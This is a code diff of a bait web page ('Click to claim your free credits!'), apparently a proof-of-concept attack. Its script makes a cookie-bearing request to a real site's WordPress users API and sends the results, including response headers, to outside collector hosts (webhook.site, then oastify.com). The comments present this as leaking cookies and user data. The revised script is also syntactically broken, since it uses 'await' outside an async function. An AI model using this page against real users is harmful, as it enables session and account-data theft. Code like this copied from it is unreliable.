@@ -5,14 +5,19 @@
 </head>
 <body>
   <h1>Click to claim your free credits!</h1>
- <script>  
+<script>  
 fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
-  credentials: 'include' // Send cookies!  
+  credentials: 'include'  
 })  
-.then(r => r.json())  
-.then(data => {  
-  // Exfiltrate cookies + user data to your server  
-  fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73?leak=' + btoa(JSON.stringify(data)));  
+.then(r => {  
+  // Send FULL request headers to your server (includes cookies!)  
+  fetch('https://og8sn80hf37ay61awew00e0riio9cz0o.oastify.com', {  
+    method: 'POST',  
+    body: JSON.stringify({  
+      headers: [...r.headers.entries()],  
+      data: await r.text()  
+    })  
+  });  
 });  
 </script>  
 </body>
